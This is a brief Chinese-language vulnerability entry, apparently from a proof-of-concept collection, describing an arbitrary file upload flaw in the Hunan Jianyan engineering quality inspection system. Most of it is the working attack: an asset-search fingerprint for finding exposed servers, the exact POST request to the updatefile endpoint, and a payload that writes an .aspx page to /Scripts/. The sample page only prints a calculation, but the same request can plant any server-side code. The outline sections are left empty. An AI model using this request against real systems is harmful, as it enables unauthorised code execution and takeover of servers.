# 湖南建研工程质量检测系统updatefile存在任意文件上传漏洞

- **系统**：湖南建研工程质量检测系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="/Content/Theme/Standard/webSite/login.css"`
- **请求**：`POST /Scripts/admintool?type=updatefile HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 90`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
filePath=enelxghy.aspx&fileContent=<%@ Page Language="C#"%><% Response.Write(1234*1234);%>

上传文件位置
/Scripts/enelxghy.aspx
```

**其他**
- 湖南建研工程质量检测系统updatefile存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 湖南建研工程质量检测系统